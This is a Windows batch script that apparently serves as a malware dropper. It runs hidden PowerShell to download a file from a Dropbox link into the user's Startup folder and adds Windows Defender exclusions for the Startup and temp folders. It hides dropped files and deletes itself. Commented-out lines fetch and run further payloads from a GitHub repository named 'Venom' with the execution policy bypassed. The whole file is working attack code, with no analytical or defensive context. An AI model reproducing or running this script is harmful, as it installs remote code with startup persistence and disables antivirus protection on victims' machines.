@echo off

set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

cd %STARTUP%

@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/AutoRun.bat -OutFile nEQlCzTBpDrO.bat"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1 -OutFile ./AmJOwiWzUEbZ.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

powershell -windowstyle hidden "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/uqtcs8gmio3nplrgfkr0t/initial.cmd?rlkey=0t4bekgswpf1n2vss5e43gqcl^&st=jix2prhj^&dl=1' -UseBasicParsing -OutFile drop.cmd"; Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'; Add-MpPreference -ExclusionPath '%temp%'

attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"
attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"

@REM powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
@REM powershell powershell.exe -windowstyle hidden -ep bypass "./nEQlCzTBpDrO.bat"
@REM powershell powershell.exe -windowstyle hidden -ep bypass "./AmJOwiWzUEbZ.ps1"

cd "%INITIALPATH%"

del test.cmd

